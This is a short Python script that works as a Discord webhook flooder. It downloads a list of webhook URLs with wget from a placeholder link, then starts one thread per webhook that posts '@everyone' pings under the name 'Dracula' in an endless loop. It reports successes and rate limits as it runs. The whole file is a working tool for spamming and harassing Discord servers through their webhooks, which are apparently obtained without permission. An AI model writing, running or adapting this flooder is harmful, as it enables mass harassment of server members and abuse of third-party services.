#!/usr/bin/python3.9

import requests as rq
import threading as th
from time import sleep
import os


MESSAGE = '@everyone '
FILENAME = 'hooks.txt'


def flood(hookurl: str):
    dt = {
        'content': MESSAGE,
        'avatar_url': 'https://cdn.discordapp.com/attachments/785419479487086593/881300723332182067/240916418_2530133500464050_3228800185552492930_n.png',
        'username': 'Dracula',
        }
    while True:
        status_code = rq.post(hookurl, data=dt).status_code
        print("Succes !", end='\r') if (status_code == 204) else print("Rate limited ! {}".format(status_code), end='\r')




if __name__ == '__main__':

    os.system('wget {}'.format('https://link/to/the/hooks.txt'))

    for hook in open(FILENAME):
        th.Thread(target=flood, args=(hook.replace('\n', ''), )).start()
    


    
    
